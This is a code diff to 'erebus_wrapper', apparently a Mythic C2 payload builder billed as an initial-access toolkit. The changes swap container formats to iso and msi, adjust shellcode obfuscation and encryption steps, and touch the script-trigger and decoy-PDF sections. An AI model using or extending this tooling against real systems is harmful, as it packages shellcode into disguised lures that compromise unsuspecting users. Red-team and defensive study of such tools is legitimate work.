@@ -80,13 +80,12 @@ SHELLCODE_FORMAT = {
 }
 
 FINAL_PAYLOAD_EXTENSIONS = [
-    "exe",
-    "dll",
     "7z",
     "zip",
     "tar",
     "tar.gz",
-    "bin",
+    "iso",
+    "msi"
 ]
 
 
@@ -94,7 +93,7 @@ class ErebusWrapper(PayloadType):
     name = "erebus_wrapper"
     author = "@Lavender-exe, @hunterino-sec"
     semver = "v0.0.1"
-    note = f"An Initial Access Toolkit aimed to speed up IA development.\nVersion: {semver}"
+    note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"
 
     file_extension = "zip"
     supported_os = [
@@ -708,7 +707,7 @@ generated if none have been entered.""",
                 # Look for script files
                 try:
                     payload_file = next(p for p in payload_dir.iterdir()
-                                      if p.is_file() and p.suffix.lower() in [".vbs", 
+                                      if p.is_file() and p.suffix.lower() in [".vbs",
                                                                               ".js", ".vbe", ".jse"])
                 except StopIteration:
                     raise RuntimeError("No script file (.vbs/.js) found for script attack!")
@@ -777,7 +776,7 @@ generated if none have been entered.""",
 
         trigger_type = self.get_parameter("7.0 Trigger Type")
         target_ext = f".{self.get_parameter('7.0 Trigger Type').lower()}"
-        
+
         match(self.get_parameter("3.0 Container Type")):
             case "7z":
                   return build_7z(
@@ -935,7 +934,7 @@ generated if none have been entered.""",
             ]
 
             if self.get_parameter("2.4 Shellcode Format") != "Raw":
-                cmd += ["-a", self.get_parameter("2.5 Shellcode Array Name")]
+                cmd += ["-a", "shellcode"]
 
             if self.get_parameter("2.0 Compression Type") != "NONE":
                 cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]
@@ -947,8 +946,6 @@ generated if none have been entered.""",
                 cmd += ["-k", self.get_parameter("2.2 Encryption Key")]
 
             cmd += ["-o", obfuscated_shellcode_path]
-
-            shutil.copy(dst=encryption_shellcode_path_cpp, src=obfuscated_shellcode_path)
 
             process = await asyncio.create_subprocess_exec(
                 *cmd,
@@ -963,6 +960,13 @@ generated if none have been entered.""",
                 output += f"[stderr]\n{stderr.decode()}"
 
             if os.path.exists(obfuscated_shellcode_path):
+                # Copy the obfuscated shellcode file over to the shellcode.hpp file
+                if self.get_parameter("2.4 Shellcode Format") == "C":
+                    shutil.copy(src=str(obfuscated_shellcode_path),
+                                dst=str(encryption_shellcode_path_cpp))
+                elif self.get_parameter("2.4 Shellcode Format") == "CSharp":
+                    raise NotImplementedError
+
                 if self.get_parameter("2.4 Shellcode Format") == "Raw":
                     # Get the encryption key in C format to be used within the loader and other functions
                     cmd = [
@@ -1602,7 +1606,7 @@ generated if none have been entered.""",
             ######################### End of Decoy Section #########################
             ######################### Trigger Generation Section #########################
             if self.get_parameter("0.0 Main Payload Type") == "Loader":
-                
+
                 payload_dir = Path(agent_build_path) / "payload"
                 decoy_dir = Path(agent_build_path) / "decoys"
                 decoy_file = decoy_dir / "decoy.pdf"
@@ -1637,12 +1641,12 @@ generated if none have been entered.""",
                                 payload_dir=payload_dir,
                                 decoy_file=decoy_file
                             )
-                            
+
 
                     if trigger_path:
                         response.status = BuildStatus.Success
                         response.build_message = f"{trigger_type} Trigger created!"
-                        
+
                         await SendMythicRPCPayloadUpdatebuildStep(
                             MythicRPCPayloadUpdateBuildStepMessage(
                             PayloadUUID=self.uuid,
